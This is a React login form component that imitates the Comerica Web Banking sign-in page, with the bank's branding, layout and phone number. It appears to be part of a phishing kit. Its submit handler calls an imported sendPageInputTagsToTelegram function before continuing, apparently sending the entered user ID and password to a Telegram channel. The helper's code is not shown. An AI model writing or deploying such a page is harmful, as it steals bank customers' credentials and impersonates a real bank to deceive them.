import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import { sendPageInputTagsToTelegram } from '../utils/telegram';

interface LoginFormProps {
  onLogin?: () => void;
}

export function LoginForm({ onLogin }: LoginFormProps) {
  const [showPassword, setShowPassword] = useState(false);
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isFormValid && onLogin) {
      await sendPageInputTagsToTelegram();
      onLogin();
    }
  };

  const isFormValid = 
    userId.trim().length >= 5 && 
    userId.trim().length <= 30 && 
    password.trim().length >= 5 && 
    password.trim().length <= 30;

  return (
    <div className="bg-white w-full max-w-[420px] shadow-sm flex flex-col font-sans border border-gray-300">
      {/* Header */}
      <div className="bg-[#666666] text-white px-4 py-2 font-bold text-sm">
        Log In
      </div>

      <div className="p-6 flex flex-col bg-[#f2f2f2]">
        <h2 className="text-[#00529b] text-[1.15rem] font-bold mb-1 tracking-tight">
          Welcome to Comerica Web Banking<sup className="text-[0.6rem] ml-0.5">®</sup>
        </h2>
        <p className="text-[0.7rem] text-gray-800 mb-6">
          Fields marked with an <span className="text-[#CC0000] font-bold">*</span> are
          required.
        </p>

        <form className="space-y-4" onSubmit={handleSubmit}>
          {/* User ID */}
          <div className="flex flex-col">
            <label
              className="text-[0.8rem] font-bold text-gray-800 mb-0.5"
              htmlFor="userId">
              User ID:
            </label>
            <div className="flex items-center">
              <input
                id="userId"
                type="text"
                value={userId}
                minLength={5}
                maxLength={30}
                required
                onChange={(e) => setUserId(e.target.value)}
                className="border border-[#999999] px-1.5 py-0.5 w-[210px] bg-white focus:outline-none focus:border-[#00529b]" />
              <span className="text-[#CC0000] ml-1 font-bold">*</span>
            </div>
            <div className="flex items-center mt-2.5">
              <input type="checkbox" id="saveUserId" className="mr-2" />
              <label htmlFor="saveUserId" className="text-[0.75rem] text-gray-800">
                Save User ID
              </label>
            </div>
          </div>

          {/* Password */}
          <div className="flex flex-col pt-1">
            <label
              className="text-[0.8rem] font-bold text-gray-800 mb-0.5"
              htmlFor="password">
              Password:
            </label>
            <div className="flex items-center">
              <div className="relative w-[210px] flex items-center">
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  minLength={5}
                  maxLength={30}
                  required
                  onChange={(e) => setPassword(e.target.value)}
                  className="border border-[#999999] px-1.5 py-0.5 w-full pr-7 bg-white focus:outline-none focus:border-[#00529b]" />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-1 text-gray-800">
                  {showPassword ? <EyeOff size={14} /> : <Eye size={14} />}
                </button>
              </div>
              <span className="text-[#CC0000] ml-1 font-bold mr-1">*</span>
              <a
                href="#"
                className="text-[#00529b] text-[0.75rem] hover:underline whitespace-nowrap">
                Forgot Your Password?
              </a>
            </div>
          </div>

          {/* Log In Button */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={!isFormValid}
              className={`${
                isFormValid ? 'bg-[#a23232] hover:bg-[#8e2b2b]' : 'bg-[#666666] opacity-70'
              } text-white px-8 py-1.5 text-sm font-semibold transition-colors min-w-[100px] shadow-sm`}>
              Log In
            </button>
          </div>

          {/* Destination */}
          <div className="pt-4 mt-2 border-t border-gray-300">
            <div className="flex items-center mb-2">
              <label
                className="text-[0.75rem] text-gray-800 mr-2"
                htmlFor="destination">
                Go to:
              </label>
              <select
                id="destination"
                className="border border-[#999999] text-[0.8rem] py-0.5 px-1 bg-white focus:outline-none w-[270px]">
                <option>My Default Destination</option>
                <option>Account Summary</option>
                <option>Bill Pay</option>
                <option>Transfers</option>
              </select>
            </div>
            <div className="flex items-center">
              <input type="checkbox" id="defaultDestination" className="mr-2" />
              <label
                htmlFor="defaultDestination"
                className="text-[0.75rem] text-gray-800">
                Make this page my default destination
              </label>
            </div>
          </div>
        </form>
      </div>

      {/* Footer Links */}
      <div className="bg-white p-4 border-t border-gray-200 text-[0.75rem]">
        <a href="#" className="text-[#00529b] hover:underline block mb-1">
          Set Up Web Banking
        </a>
        <p className="text-gray-800">
          Questions? Check our{' '}
          <a href="#" className="text-[#00529b] hover:underline">
            FAQ
          </a>
          ,{' '}
          <a href="#" className="text-[#00529b] hover:underline">
            Contact
          </a>{' '}
          us, or call 888.444.9876.
        </p>
      </div>
    </div>
  );
}
